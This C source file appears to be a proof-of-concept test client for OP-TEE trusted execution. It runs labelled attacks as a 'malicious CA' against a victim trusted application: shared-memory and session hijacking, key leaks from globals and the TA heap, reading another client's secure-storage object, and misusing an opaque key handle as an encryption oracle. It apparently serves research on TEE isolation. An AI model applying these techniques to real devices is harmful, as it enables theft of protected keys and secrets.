/*
 * Copyright (c) 2016, Linaro Limited
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice,
 * this list of conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 * this list of conditions and the following disclaimer in the documentation
 * and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 */

#include <err.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ipc.h>
#include <sys/shm.h>

/* OP-TEE TEE client API (built by optee_client) */
#include <tee_client_api.h>

/*
 * This UUID is generated with uuidgen
 * the ITU-T UUID generator at http://www.itu.int/ITU-T/asn1/uuid.html
 */
#define TA_SEMANTIC_VICTIM_UUID \
	{ 0x7071099b, 0x40f9, 0x4761, \
		{ 0xb4, 0x47, 0x66, 0x77, 0xb9, 0xb8, 0x9c, 0xd3} }

/* The function IDs implemented in this TA */
#define TA_SEMANTIC_VICTIM_CMD_SECURE_INITIALIZATION		0
#define TA_SEMANTIC_VICTIM_CMD_SECURE_WRITE_SHM				1
#define TA_HPE_VICTIM_CMD_STORE_SECRET						2
#define TA_HPE_VICTIM_CMD_LOAD_SECRET						3
#define TA_SECURE_STORAGE_CMD_READ_RAW						4
#define TA_SECURE_STORAGE_CMD_WRITE_RAW						5
#define TA_SECURE_STORAGE_CMD_DELETE						6
#define TA_HEAP_PARAM_PAC_CMD_ALLOC_HEAP					7
#define TA_HEAP_PARAM_PAC_CMD_READ_HEAP						8
#define TA_HEAP_PARAM_PAC_CMD_WRITE_HEAP					9
#define TA_HEAP_PARAM_PAC_CMD_RELEASE_HEAP					10
#define TA_ACIPHER_CMD_GEN_KEY								11
#define TA_ACIPHER_CMD_ENCRYPT								12

#define BUFFER_SIZE    20

TEEC_Result read_secure_object(TEEC_Session *sess, char *id,
			char *data, size_t data_len)
{
	TEEC_Operation op;
	uint32_t origin;
	TEEC_Result res;
	size_t id_len = strlen(id);

	memset(&op, 0, sizeof(op));
	op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT,
					 TEEC_MEMREF_TEMP_OUTPUT,
					 TEEC_NONE, TEEC_NONE);

	op.params[0].tmpref.buffer = id;
	op.params[0].tmpref.size = id_len;

	op.params[1].tmpref.buffer = data;
	op.params[1].tmpref.size = data_len;

	res = TEEC_InvokeCommand(sess,
				 TA_SECURE_STORAGE_CMD_READ_RAW,
				 &op, &origin);
	switch (res) {
	case TEEC_SUCCESS:
	case TEEC_ERROR_SHORT_BUFFER:
	case TEEC_ERROR_ITEM_NOT_FOUND:
		break;
	default:
		break;
	}

	return res;
}

#define TEST_OBJECT_SIZE	7000
#define ACIPHER_SIZE		1024

int main(int argc, char const *argv[])
{
	TEEC_Result res;
	TEEC_Context ctx;
	TEEC_Session sess;
	TEEC_Operation op;
	TEEC_SharedMemory shm;
	TEEC_UUID uuid = TA_SEMANTIC_VICTIM_UUID; 
	uint32_t err_origin;
	uint64_t key = 0x66546A576D5A7134;

	res = TEEC_InitializeContext(NULL, &ctx);
	if (res != TEEC_SUCCESS)
		errx(1, "TEEC_InitializeContext failed with code 0x%x", res);

	res = TEEC_OpenSession(&ctx, &sess, &uuid,
			       TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
	if (res != TEEC_SUCCESS)
		errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x",
			res, err_origin);

	/* Test shared memory hijacking */
	printf("\033[1;37;44m[*] Test shared memory hijacking\033[0m\n");
	printf("    [-] The victim CA has stored key '0x%lX' in shared memory\n", key);
	memset(&op, 0, sizeof(op));
	memset(&shm, 0, sizeof(shm));

	op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_PARTIAL_INPUT, TEEC_NONE,
					 TEEC_NONE, TEEC_NONE);

	printf("    [-] The malicious CA uses the same shared memory id 1\n");

	shm.id = 1;
	shm.size = BUFFER_SIZE;
	shm.flags = TEEC_MEM_INPUT | TEEC_MEM_OUTPUT;

	op.params[0].memref.parent = &shm;
	op.params[0].memref.size = BUFFER_SIZE;
	op.params[0].memref.offset = 0;

	printf("    [-] The malicious CA tries to corrupt the shared memory\n");

	res = TEEC_InvokeCommand(&sess, TA_SEMANTIC_VICTIM_CMD_SECURE_WRITE_SHM, &op,
				 &err_origin);
	if (res != TEEC_SUCCESS)
		errx(1, "TEEC_InvokeCommand failed with code 0x%x origin 0x%x",
			res, err_origin);

	TEEC_CloseSession(&sess);

	/* Test session hijacking */
	printf("\033[1;37;44m[*] Test session hijacking\033[0m\n");
	TEEC_Session fake_sess;
	fake_sess.ctx = &ctx;
	printf("    [-] The malicious CA impersonates a session with id 1\n");
	fake_sess.session_id = 1;
	printf("    [-] The malicious CA tries to close victim CA's session\n");
	TEEC_CloseSession(&fake_sess);

	/* Test the protection of global and static variables */
	printf("\033[1;37;44m[*] Test the protection of global and static variables\033[0m\n");
	printf("    [-] The victim CA has stored key '0x%lX' in global variable\n", key);
	res = TEEC_OpenSession(&ctx, &sess, &uuid,
			       TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
	if (res != TEEC_SUCCESS)
		errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x",
			res, err_origin);
	memset(&op, 0, sizeof(op));
	op.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_OUTPUT, TEEC_NONE,
					 TEEC_NONE, TEEC_NONE);

	printf("    [-] The malicious CA tries to leak victim CA's key: '0x%lX'\n", key);
	res = TEEC_InvokeCommand(&sess, TA_HPE_VICTIM_CMD_LOAD_SECRET, &op,
				 &err_origin);
	TEEC_CloseSession(&sess);

	/* Test compromise on TA's heap */
	printf("\033[1;37;44m[*] Test compromise on TA's heap\033[0m\n");
	printf("    [-] The victim CA has stored key '0x%lX' in TA's heap\n", key);

	res = TEEC_OpenSession(&ctx, &sess, &uuid,
			       TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
	if (res != TEEC_SUCCESS)
		errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x",
			res, err_origin);

	int shmid;
    key_t key_id = ftok("shared_memory_key", 123);
    size_t size = sizeof(uint32_t) * 2;

    shmid = shmget(key_id, size, 0666);

    int* sharedData = (int*)shmat(shmid, NULL, 0);

	memset(&op, 0, sizeof(op));
	op.paramTypes = TEEC_PARAM_TYPES(TEEC_INVARIANT_VALUE_INPUT, TEEC_VALUE_OUTPUT,
					 TEEC_NONE, TEEC_NONE);
    op.params[0].value.a = sharedData[0];
    op.params[0].value.b = sharedData[1];

	printf("    [-] The malicious CA got TA's heap address: 0x%X%X\n", 
			op.params[0].value.b, op.params[0].value.a);

    shmdt(sharedData);
	
	printf("    [-] The malicious CA tries to leak victim CA's key: '0x%lX'\n", key);
	res = TEEC_InvokeCommand(&sess, TA_HEAP_PARAM_PAC_CMD_READ_HEAP, &op,
				 &err_origin);
	TEEC_CloseSession(&sess);

	/* Test storage hijacking */
	res = TEEC_OpenSession(&ctx, &sess, &uuid,
			       TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
	if (res != TEEC_SUCCESS)
		errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x",
			res, err_origin);
	printf("\033[1;37;44m[*] Test storage hijacking\033[0m\n");
	printf("    [-] The victim CA deposits sensitive data to the storage with ID 'object#1'\n");
	printf("    [-] The malicious CA tries to leak victim CA's data with ID 'object#1'\n");
	char obj1_id[] = "object#1";		/* string identification for the object */
	char read_data[TEST_OBJECT_SIZE];
	res = read_secure_object(&sess, obj1_id,
				 read_data, sizeof(read_data));
	TEEC_CloseSession(&sess);

	/* Test opaque handles */
	printf("\033[1;37;44m[*] Test opaque handles\033[0m\n");
	res = TEEC_OpenSession(&ctx, &sess, &uuid,
			       TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
	if (res != TEEC_SUCCESS)
		errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x",
			res, err_origin);

	int shmid_acipher;
    key_t key_acipher = ftok("shared_memory_key", 456);

    shmid_acipher = shmget(key_acipher, size, 0666);

    int* shared_acipher = (int*)shmat(shmid_acipher, NULL, 0);

	memset(&op, 0, sizeof(op));
	op.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_INPUT, TEEC_MEMREF_TEMP_INPUT,
					 TEEC_MEMREF_TEMP_OUTPUT, TEEC_NONE);
	uint8_t input[ACIPHER_SIZE];
	memset(input, 'A', ACIPHER_SIZE);
    op.params[0].value.a = shared_acipher[0];
    op.params[0].value.b = shared_acipher[1];
	op.params[0].tmpref.buffer = input;
	op.params[0].tmpref.size = ACIPHER_SIZE;

	printf("    [-] The malicious CA got opaque handle: 0x%X%X\n", 
			op.params[0].value.b, op.params[0].value.a);

    shmdt(shared_acipher);
	
	printf("    [-] The malicious CA turns TA into an encrypted oracle\n");
	res = TEEC_InvokeCommand(&sess, TA_ACIPHER_CMD_ENCRYPT, &op,
				 &err_origin);
	TEEC_CloseSession(&sess);

	TEEC_FinalizeContext(&ctx);

	return 0;
}
